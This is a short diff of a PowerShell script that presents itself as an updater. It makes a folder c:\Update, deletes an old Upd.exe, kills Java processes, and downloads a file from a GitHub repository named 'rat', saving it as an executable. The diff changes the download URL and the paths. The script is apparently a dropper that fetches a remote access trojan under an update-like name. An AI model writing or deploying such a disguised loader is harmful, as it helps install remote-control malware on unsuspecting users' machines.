@@ -3,7 +3,7 @@ md Update
 
 cd c:\Update
 
-$f1 = 'c:\windows\Upd.exe'
+$f1 = 'c:\Update\Upd0001.exe'
 if (Test-Path $f1) {
    try {	
       Remove-Item $f1 -recurse
@@ -16,8 +16,8 @@ if ($f3) {
    Stop-Process -processname Java
 }
 
-$url = "https://github.com/itarare/rat/raw/master/Upd0001.txt"
-$output = "c:\Update\windows\Upd.exe"
+$url = "https://raw.githubusercontent.com/itarare/rat/master/Upd0001.txt"
+$output = "c:\Update\Upd.exe"
 $start_time = Get-Date
 
 Invoke-WebRequest -Uri $url -OutFile $output
